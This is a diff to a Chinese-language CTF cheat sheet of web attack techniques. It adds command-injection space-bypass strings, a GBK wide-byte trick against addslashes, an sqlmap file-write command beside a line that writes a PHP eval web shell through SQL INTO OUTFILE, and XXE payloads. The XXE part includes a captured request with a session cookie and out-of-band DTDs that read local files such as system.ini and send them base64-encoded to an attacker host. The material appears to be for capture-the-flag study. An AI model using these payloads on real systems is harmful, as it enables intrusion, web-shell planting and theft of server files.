@@ -1,5 +1,14 @@
 # Web常用语句
 
+## 命令执行
+
+> < <> 重定向符
+%09(需要php环境)
+${IFS}
+$IFS$9
+{cat,flag.php} //用逗号实现了空格功能
+%20
+%09
 
 ## SQL注入
 
@@ -68,6 +77,8 @@ HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中�
 
 （1）宽字节注入
 
+国内最常使用的 GBK 编码，这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。反斜杠 \ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。
+
 （2）二次注入
 
 ![](images/ctf-2021-06-17-23-48-07.png)
@@ -89,7 +100,7 @@ HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中�
 查字段：select group_concat(column_name) from information_schema.columns where table_name='表名'
 读取某行：select * from mysql.user limit n,m // limit m offset n （第n行之后m行，第一行为0）
 读文件：select load_file('/etc/passwd')
-写文件：select '<?php @eval($_POST[a]);?>' into outfile '/var/www/html/a.php'  //该处文件名无法使用16进制绕过
+写文件：select '<?php @eval($_POST[a]);?>' into outfile '/var/www/html/a.php'  //该处文件名无法使用16进制绕过 sqlmap -u "xxxxx" --file-write="/root/Desktop/1.txt" --file-dest="f:\1.txt"
 ```
 
 #### 常用函数
@@ -674,9 +685,62 @@ GROUP_CONCAT()，用来连接查询出来的很多行，上面两个都是连接
 
 ## XXE
 
+```
+POST / HTTP/1.1
+Host: 101.132.135.45:28001
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Content-Type: text/xml
+Referer: http://101.132.135.45:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: session=13618e55-714d-4932-ae36-c6aa405f8fff.vBpJ9Y-0gDfL6_Feoc8giial35Y
+Connection: close
+Content-Length: 392
+
+<?xml version="1.0"?>
+<!DOCTYPE note [
+  <!ELEMENT note (to,from,heading,body)>
+  <!ELEMENT to      (#PCDATA)>
+  <!ELEMENT from    (#PCDATA)>
+  <!ELEMENT heading (#PCDATA)>
+  <!ELEMENT body    (#PCDATA)>
+  <!ENTITY xxe SYSTEM "file:///flag">
+]>
+<note>
+  <to>George &xxe;</to>
+  <from>John</from>
+  <heading>Reminder</heading>
+  <body>Don't forget the meeting!</body>
+</note>
+
+```
+
+![](images/ctf-2021-06-22-16-26-24.png)
+
 ### 有回显
 
 （1）直接将外部实体引用的URI设置为敏感目录
+
+```php
+<?php
+    libxml_disable_entity_loader (false);
+    //若为true，则表示禁用外部实体
+    $xmlfile = file_get_contents('php://input');
+    //可以获取POST来的数据
+    $dom = new DOMDocument();
+    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+    $creds = simplexml_import_dom($dom);
+    echo $creds;
+?>
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE creds [  
+<!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"> ]>
+<creds>&goodies;</creds>
+```
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
@@ -707,6 +771,8 @@ GROUP_CONCAT()，用来连接查询出来的很多行，上面两个都是连接
 
 可以使用外带数据通道提取数据，先使用 filter:/// 获取目标文件的内容，然后将内容以 http 请求发送到接收数据的服务器（攻击服务器）。实体 remote，all，send 的引用顺序很重要，首先对 remote 引用的目的是将外部文件 evil.xml 引入到解释上下文中，然后执行 %all，这时会检测到 send 实体，在 root 节点中引用 send，就可以成功实现数据转发
 
+ 第一种
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE convert [ 
@@ -721,6 +787,24 @@ evil.dtd 的内容，注意`&#37`不是乱码，就是这样写。
 ```xml
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/xxe/admin.php">
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.248.1:8000?p=%file;'>">
+```
+
+第二种
+
+```xml
+<!DOCTYPE convert [ 
+<!ENTITY % remote SYSTEM "http://192.168.2.119/evil.dtd">
+%remote;%int;%send;
+]>
+<root><name>admin2</name><password>admin;</password></root>
+```
+
+evil.dtd 的内容，注意`&#37`不是乱码，就是这样写。
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/windows/system.ini">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.2.119?p=%file;'>">
 ```
 
 ## SSRF
